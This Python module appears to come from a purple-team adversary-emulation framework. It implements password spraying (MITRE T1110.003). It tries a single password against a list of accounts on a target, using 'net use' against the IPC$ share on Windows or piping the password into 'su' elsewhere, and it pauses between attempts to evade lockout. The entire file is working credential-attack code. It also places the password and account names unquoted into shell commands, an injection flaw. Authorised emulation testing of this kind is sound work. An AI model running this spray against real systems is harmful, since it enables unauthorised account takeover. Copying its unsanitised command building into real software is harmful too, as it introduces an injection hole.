from __future__ import annotations

import asyncio
import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        password = parameters.get("password")
        if not password:
            return TechniqueResult(
                technique_id="T1110.003",
                success=False,
                error="password parameter is required",
                execution_status=ExecutionStatus.FAILURE,
            )
        account_list = parameters.get("account_list")
        if not account_list:
            return TechniqueResult(
                technique_id="T1110.003",
                success=False,
                error="account_list parameter is required",
                execution_status=ExecutionStatus.FAILURE,
            )
        delay_seconds = parameters.get("delay_seconds", 10)
        accounts = account_list.split(",")
        results = []
        is_windows = conn.is_windows if hasattr(conn, "is_windows") else True
        for account in accounts:
            account = account.strip()
            if not account:
                continue
            if is_windows:
                cmd = f"net use \\\\{target}\\ipc$ /user:{account} {password}"
                result = await conn.run_ps(cmd)
            else:
                result = await conn.run_command(f"echo {password} | su - {account} -c echo 2>&1")
            results.append(f"Account '{account}': {'success' if result.success else 'failed'}")
            await asyncio.sleep(delay_seconds)
        output = "\n".join(results)
        return TechniqueResult(
            technique_id="T1110.003",
            success=True,
            output=output[:4096],
            execution_status=ExecutionStatus.SUCCESS,
        )
    except Exception as e:
        logger.error(f"T1110.003 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1110.003",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    pass
